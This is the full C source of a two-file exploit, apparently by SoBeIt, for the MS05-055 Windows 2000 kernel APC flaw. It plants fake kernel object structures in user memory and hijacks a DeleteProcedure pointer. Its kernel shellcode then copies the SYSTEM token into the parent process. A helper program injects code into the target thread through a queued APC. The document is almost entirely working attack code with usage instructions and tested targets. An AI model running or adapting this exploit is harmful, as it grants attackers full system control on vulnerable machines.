/*
MS05-055 Windows Kernel APC Data-Free Local Privilege Escalation Vulnerability Exploit
Created by SoBeIt
12.25.2005

Main file of exploit

Tested on:

Windows 2000 PRO SP4 Chinese
Windows 2000 PRO SP4 Rollup 1 Chinese
Windows 2000 PRO SP4 English
Windows 2000 PRO SP4 Rollup 1 English

Usage:ms05-055.exe helper.exe
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;windows.h&gt;


#define NTSTATUS ULONG
#define ProcessBasicInformation 0

typedef VOID (NTAPI *PKNORMAL_ROUTINE)(PVOID ApcContext, PVOID Argument1, PVOID Argument2);

typedef struct _UNICODE_STRING {
USHORT Length;
USHORT MaximumLength;
PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PROCESS_BASIC_INFORMATION {
NTSTATUS ExitStatus;
PVOID PebBaseAddress;
ULONG AffinityMask;
ULONG BasePriority;
ULONG UniqueProcessId;
ULONG InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

typedef struct _EPROCESS_QUOTA_BLOCK {
ULONG QuotaLock;
ULONG ReferenceCount;
ULONG QuotaPeakPoolUsage[2];
ULONG QuotaPoolUsage[2];
ULONG QuotaPoolLimit[2];
ULONG PeakPagefileUsage;
ULONG PagefileUsage;
ULONG PagefileLimit;
} EPROCESS_QUOTA_BLOCK, *PEPROCESS_QUOTA_BLOCK;

typedef struct _OBJECT_TYPE_INITIALIZER {
USHORT Length;
BOOLEAN UseDefaultObject;
BOOLEAN Reserved;
ULONG InvalidAttributes;
UCHAR GenericMapping[0x10];
ULONG ValidAccessMask;
BOOLEAN SecurityRequired;
BOOLEAN MaintainHandleCount;
BOOLEAN MaintainTypeList;
USHORT PoolType;
ULONG DefaultPagedPoolCharge;
ULONG DefaultNonPagedPoolCharge;
PVOID DumpProcedure;
PVOID OpenProcedure;
PVOID CloseProcedure;
PVOID DeleteProcedure;
PVOID ParseProcedure;
PVOID SecurityProcedure;
PVOID QueryNameProcedure;
PVOID OkayToCloseProcedure;
} OBJECT_TYPE_INITIALIZER, *POBJECT_TYPE_INITIALIZER;

typedef struct _OBJECT_TYPE {
UCHAR Mutex[0x38];
LIST_ENTRY TypeList;
UNICODE_STRING Name;
PVOID DefaultObject;
ULONG Index;
ULONG TotalNumberOfObjects;
ULONG TotalNumberOfHandles;
ULONG HighWaterNumberOfObjects;
ULONG HighWaterNumberOfHandles;
OBJECT_TYPE_INITIALIZER TypeInfo;
} OBJECT_TYPE, *POBJECT_TYPE;

typedef struct _OBJECT_HEADER {
ULONG PointerCount;
ULONG HandleCount;
POBJECT_TYPE Type;
UCHAR NameInfoOffset;
UCHAR HandleInfoOffset;
UCHAR QuotaInfoOffset;
UCHAR Flags;
PVOID QuotaBlockCharged;
PVOID SecurityDescriptor;
} OBJECT_HEADER, *POBJECT_HEADER;

__declspec(naked)
NTSTATUS
NTAPI
ZwQueueApcThread(
HANDLE hThread,
PKNORMAL_ROUTINE ApcRoutine,
PVOID ApcContext,
PVOID Argument1,
PVOID Argument2)
{
__asm
{
mov eax, 0x9e
lea edx, [esp+4]
int 0x2e
ret 0x14
}
}

__declspec(naked)
NTSTATUS
ZwAlertThread(
HANDLE hThread)
{
__asm
{
mov eax, 0x0c
lea edx, [esp+4]
int 0x2e
ret 0x4
}
}

__declspec(naked)
NTSTATUS
NTAPI
ZwQueryInformationProcess(
HANDLE ProcessHandle,
ULONG InformationClass,
PVOID ProcessInformation,
ULONG ProcessInformationLength,
PULONG ReturnLength)
{
__asm
{
mov eax, 0x86
lea edx, [esp+4]
int 0x2e
ret 0x14
}
}

HANDLE hTargetThread;
ULONG ParentProcessId;

VOID NTAPI APCProc(PVOID pApcContext, PVOID Argument1, PVOID Argument2)
{
printf(&quot;%s\n&quot;, pApcContext);

return;
}

VOID ErrorQuit(char *msg)
{
printf(msg);
ExitProcess(0);
}

ULONG WINAPI TestThread(PVOID pParam)
{
CONTEXT Context;
ULONG i = 0;
HANDLE hThread, hEvent = (HANDLE)pParam;
int PoolIndex, PoolType;

for(;;)
{
if((hThread = CreateThread(NULL, 0, TestThread, pParam, CREATE_SUSPENDED, NULL)) == NULL)
ErrorQuit(&quot;Create thread failed.\n&quot;);

Context.ContextFlags = CONTEXT_INTEGER;
if(!GetThreadContext(GetCurrentThread(), &amp;Context))
ErrorQuit(&quot;Child thread get context failed.\n&quot;);

printf(&quot;Child ESP:%x\n&quot;, Context.Esp);
PoolType = (Context.Esp &gt;&gt; 16) &amp; 0xff;
PoolIndex = ((Context.Esp &gt;&gt; 8) &amp; 0xff) - 1;
printf(&quot;PoolIndex:%2x PoolType:%2x\n&quot;, PoolIndex, PoolType);
if((PoolIndex &amp; 0x80) &amp;&amp; (PoolType &amp; 0x8) &amp;&amp; (PoolType &amp; 0x3) &amp;&amp; !(PoolType &amp; 0x20) &amp;&amp; 
!(PoolType &amp; 0x40))
{
printf(&quot;Perfect ESP:%x\n&quot;, Context.Esp);
break;
}

Sleep(500);
ResumeThread(hThread);
CloseHandle(hThread);
SuspendThread(GetCurrentThread());
}

DuplicateHandle(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), 
&amp;hTargetThread, 0, FALSE, DUPLICATE_SAME_ACCESS);
SetEvent(hEvent);
SuspendThread(hTargetThread);
ZwQueueApcThread(hTargetThread, APCProc, NULL, NULL, NULL);
printf(&quot;In child thread. Now terminating to trigger the bug.\n&quot;);
ExitThread(0);

return 1;
}

__declspec(naked) ExploitFunc()
{
__asm
{
// int 0x3
mov esi, 0xffdff124
mov esi, dword ptr [esi]
mov eax, dword ptr [esi+0x44]

mov ecx, 0x8
call FindProcess
mov edx, eax

mov ecx, ParentProcessId
call FindProcess

mov ecx, dword ptr [edx+0x12c]
mov dword ptr [eax+0x12c], ecx
xor ebx, ebx
xor edi, edi
mov dword ptr [ebp+0xf0], edi
add esp, 0x74
add ebp, 0x10c
ret

FindProcess:
mov eax, dword ptr [eax+0xa0]
sub eax, 0xa0
cmp dword ptr [eax+0x9c], ecx
jne FindProcess
ret
}
}

int main(int argc, char *argv[])
{
HANDLE hThread, hEvent, hProcess;
PEPROCESS_QUOTA_BLOCK pEprocessQuotaBlock;
POBJECT_HEADER pObjectHeader;
POBJECT_TYPE pObjectType;
ULONG i = 0, ProcessId;
STARTUPINFO si;
PROCESS_INFORMATION pi;
PROCESS_BASIC_INFORMATION pbi;
char Buf[64], *pParam;
PULONG pKernelData;

printf(&quot;\n MS05-055 Windows Kernel APC Data-Free Local Privilege 
Escalation Vulnerability Exploit \n\n&quot;);
printf(&quot;\t Create by SoBeIt. \n\n&quot;);
if(argc != 2)
{
printf(&quot; Usage:ms05-055.exe helper.exe. \n\n&quot;);
return 1;
}

ZeroMemory(&amp;si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&amp;pi, sizeof(pi));

if((pKernelData = VirtualAlloc((PVOID)0x1000000, 0x1000, 
MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL)
ErrorQuit(&quot;Allocate pKernelData failed.\n&quot;);

if((pEprocessQuotaBlock = VirtualAlloc(NULL, sizeof(EPROCESS_QUOTA_BLOCK), 
MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)) == NULL)
ErrorQuit(&quot;Allocate pEprocessQuotaBlock failed.\n&quot;);

if((pObjectHeader = VirtualAlloc(NULL, sizeof(OBJECT_HEADER), 
MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)) == NULL)
ErrorQuit(&quot;Allocate pObjectHeader failed\n&quot;);

if((pObjectType = VirtualAlloc(NULL, sizeof(OBJECT_TYPE), 
MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)) == NULL)
ErrorQuit(&quot;Allocate pObjectType failed.\n&quot;);

ZeroMemory((PVOID)0x1000000, 0x1000);
ZeroMemory(pEprocessQuotaBlock, sizeof(EPROCESS_QUOTA_BLOCK));
ZeroMemory(pObjectHeader, sizeof(OBJECT_HEADER));
ZeroMemory(pObjectType, sizeof(OBJECT_TYPE));

pKernelData[0xee] = (ULONG)pEprocessQuotaBlock; //0xae = (0x1b8+0x200) / 4
pEprocessQuotaBlock-&gt;ReferenceCount = 0x221;
pEprocessQuotaBlock-&gt;QuotaPeakPoolUsage[0] = 0x1f4e4;
pEprocessQuotaBlock-&gt;QuotaPeakPoolUsage[1] = 0x78134;
pEprocessQuotaBlock-&gt;QuotaPoolUsage[0] = 0x1e5e8;
pEprocessQuotaBlock-&gt;QuotaPoolUsage[1] = 0x73f64;
pEprocessQuotaBlock-&gt;QuotaPoolLimit[0] = 0x20000;
pEprocessQuotaBlock-&gt;QuotaPoolLimit[1] = 0x80000;
pEprocessQuotaBlock-&gt;PeakPagefileUsage = 0x5e9;
pEprocessQuotaBlock-&gt;PagefileUsage = 0x5bb;
pEprocessQuotaBlock-&gt;PagefileLimit = 0xffffffff;

pObjectHeader = (POBJECT_HEADER)(0x1000200-0x18);
pObjectHeader-&gt;PointerCount = 1;
pObjectHeader-&gt;Type = pObjectType;

pObjectType-&gt;TypeInfo.DeleteProcedure = ExploitFunc;

hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), GetCurrentProcess(), 
&amp;hProcess, 0, FALSE, DUPLICATE_SAME_ACCESS);

if((hThread = CreateThread(NULL, 0, TestThread, (PVOID)hEvent, CREATE_SUSPENDED, NULL)) == NULL)
ErrorQuit(&quot;Create thread failed.\n&quot;);

ResumeThread(hThread);
WaitForSingleObject(hEvent, INFINITE);
printf(&quot;The sleep has awaken.\n&quot;);
ProcessId = GetCurrentProcessId();
printf(&quot;Target thread handle:%x, Target process handle:%x, Process id:%x\n&quot;, 
hTargetThread, hProcess, ProcessId);
pParam = Buf;
strcpy(Buf, argv[1]);
pParam += sizeof(argv[1]);
pParam = strchr(Buf, '\0');
*pParam++ = ' ';
itoa((int)hTargetThread, pParam, 10);
pParam = strchr(Buf, '\0');
*pParam++ = ' ';
itoa(ProcessId, pParam, 10);
printf(&quot;%s\n&quot;, Buf);
if(!CreateProcess(NULL, Buf, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi ))
ErrorQuit(&quot;Create process failed,\n&quot;);

CloseHandle(pi.hThread);
CloseHandle(hEvent);
printf(&quot;Now waitting for triggering the bug.\n&quot;);
WaitForSingleObject(pi.hProcess, INFINITE);
if(ZwQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, 
(PVOID)&amp;pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL))
ErrorQuit(&quot;Query parent process failed\n&quot;);

ParentProcessId = pbi.InheritedFromUniqueProcessId;
printf(&quot;Parent process id:%x\n&quot;, ParentProcessId);

CloseHandle(pi.hProcess);
ResumeThread(hTargetThread);
WaitForSingleObject(hTargetThread, INFINITE);
printf(&quot;Exploit finished.\n&quot;);

return 1;
}


-------------------------------------------------- helper.c --------------------------------------------------

/*
MS05-055 Windows Kernel APC Data-Free Local Privilege Escalation Vulnerability Exploit
Created by SoBeIt
12.25.2005

Helper file of exploit

Tested on:

Windows 2000 PRO SP4 Chinese
Windows 2000 PRO SP4 Rollup 1 Chinese
Windows 2000 PRO SP4 English
Windows 2000 PRO SP4 Rollup 1 English

Usage:ms05-055.exe helper.exe
*/


#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

#define NTSTATUS ULONG

typedef VOID (NTAPI *PKNORMAL_ROUTINE)(PVOID ApcContext, PVOID Argument1, PVOID Argument2);

__declspec(naked)
NTSTATUS
NTAPI
ZwQueueApcThread(
HANDLE hThread,
PKNORMAL_ROUTINE ApcRoutine,
PVOID ApcContext,
PVOID Argument1,
PVOID Argument2)
{
__asm
{
mov eax, 0x9e
lea edx, [esp+4]
int 0x2e
ret 0x14
}
}

__declspec(naked)
NTSTATUS
ZwAlertThread(
HANDLE hThread)
{
__asm
{
mov eax, 0x0c
lea edx, [esp+4]
int 0x2e
ret 0x4
}
}

VOID NTAPI ApcProc(PVOID ApcContext, PVOID Argument1, PVOID Argument2)
{
}

int main(int argc, char *argv[])
{
HANDLE hTargetThread, hTargetProcess, hThread;
int ProcessId;
PVOID pApcProc;

if(argc != 3)
{
printf(&quot; Usage:ms05-055.exe helper.exe. \n&quot;);
return 1;
}

hTargetThread = (HANDLE)atoi(argv[1]);
ProcessId = atoi(argv[2]);
printf(&quot;Got thread handle:%x, Got process id:%x\n&quot;, hTargetThread, ProcessId);
hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
printf(&quot;Process handle:%x\n&quot;, hTargetProcess);
if(!DuplicateHandle(hTargetProcess, hTargetThread, GetCurrentProcess(), 
&amp;hThread, 0, FALSE, DUPLICATE_SAME_ACCESS))
printf(&quot;Duplicate handle failed.\n&quot;);

if((pApcProc = VirtualAllocEx(hTargetProcess, 0, 1024*4, MEM_COMMIT|MEM_RESERVE, 
PAGE_EXECUTE_READWRITE)) == NULL)
printf(&quot;Allocate remote memory failed.\n&quot;);

if(!WriteProcessMemory(hTargetProcess, pApcProc, &amp;ApcProc, 1024*4, 0))
printf(&quot;Write remote memory failed.\n&quot;);

ZwAlertThread(hThread);
ZwQueueApcThread(hThread, (PKNORMAL_ROUTINE)pApcProc, NULL, NULL, NULL);
CloseHandle(hTargetProcess);
CloseHandle(hThread);
printf(&quot;Now terminating process.\n&quot;);
ExitProcess(0);
}
